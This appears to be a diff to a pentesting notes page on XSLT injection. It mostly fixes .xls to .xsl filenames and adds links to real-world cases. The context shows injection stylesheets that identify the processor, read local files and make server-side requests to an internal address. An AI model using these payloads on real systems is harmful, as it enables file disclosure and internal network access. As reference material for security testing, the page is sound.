@@ -81,7 +81,7 @@ XSLT Injection can occur when arbitrary XSLT file upload is possible or when an 
 
 Referring to the example above, we can enumerate the underlying preprocessor with the following file:
 
-*enum.xls*
+*enum.xsl*
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
@@ -96,11 +96,11 @@ Referring to the example above, we can enumerate the underlying preprocessor wit
 ```
 
 ```html
-$ saxonb-xslt -xsl:enum.xls catalogue.xml
+$ saxonb-xslt -xsl:enum.xsl catalogue.xml
 <h2>XSLT identification</h2><b>Version:</b>2.0<br><b>Vendor:</b>SAXON 9.1.0.8 from Saxonica<br><b>Vendor URL:</b>http://www.saxonica.com/<br>
 ```
 
-*full-enum.xls*
+*full-enum.xsl*
 ```xml
 <?xml version="1.0" encoding="ISO-8859-1"?>
 <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
@@ -133,7 +133,7 @@ Based on the preprocessor, we can go to the XSLT documentation for this version 
 - `unparsed-text`: can be used to read local files
 - `xsl:include`: can be used to perform SSRF
 
-*read.xls*
+*read.xsl*
 ```xml
 <xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:abc="http://php.net/xsl" version="1.0">
 <xsl:template match="/">
@@ -142,7 +142,7 @@ Based on the preprocessor, we can go to the XSLT documentation for this version 
 </xsl:stylesheet>
 ```
 
-*ssrf.xls*
+*ssrf.xsl*
 ```xml
 <xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:abc="http://php.net/xsl" version="1.0">
 <xsl:include href="http://127.0.0.1:5000/xslt"/>
@@ -151,6 +151,11 @@ Based on the preprocessor, we can go to the XSLT documentation for this version 
 </xsl:stylesheet>
 ```
 
-We can also use the following fuzzing wordlist specific for XLS [^xlst] to enumerate other available functionalities.
+We can also use the following fuzzing wordlist specific for xsl [^xslt] to enumerate other available functionalities.
 
-[^xlst]: [xlst.txt](https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/xslt.txt), carlospolop
+[^xslt]: [xslt.txt](https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/xslt.txt), carlospolop
+
+## Real Life Vulnerabilities
+
+- [Getting XXE in Web Browsers using ChatGPT](https://swarm.ptsecurity.com/xxe-chrome-safari-chatgpt/)
+- [XSLT to RCE](https://gosecure.ai/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations/#:~:text=by%20the%20attacker.-,XSLT%20to%20RCE,-The%20XSLT%20processing)
